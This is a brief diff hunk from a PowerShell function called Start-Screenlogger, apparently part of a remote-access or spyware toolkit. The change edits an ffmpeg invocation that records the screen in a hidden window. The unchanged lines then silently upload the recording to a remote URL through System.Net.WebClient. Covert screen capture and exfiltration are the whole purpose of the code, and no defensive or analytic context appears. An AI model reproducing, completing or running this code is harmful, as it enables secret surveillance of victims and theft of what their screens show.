@@ -70,7 +70,7 @@ function Start-Screenlogger{
             "$path"
         );
 
-        Start-Process -FilePath ".\ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList $ffmpegArgs -Wait -WindowStyle hidden;
+        Start-Process -FilePath "ffmpeg-master-latest-win64-gpl\bin\ffmpeg.exe" -ArgumentList "$ffmpegArgs" -Wait -WindowStyle hidden;
         
         if(Test-Path $path){
             (New-Object System.Net.WebClient).UploadFile($url,$path) > $null | Wait-Process;
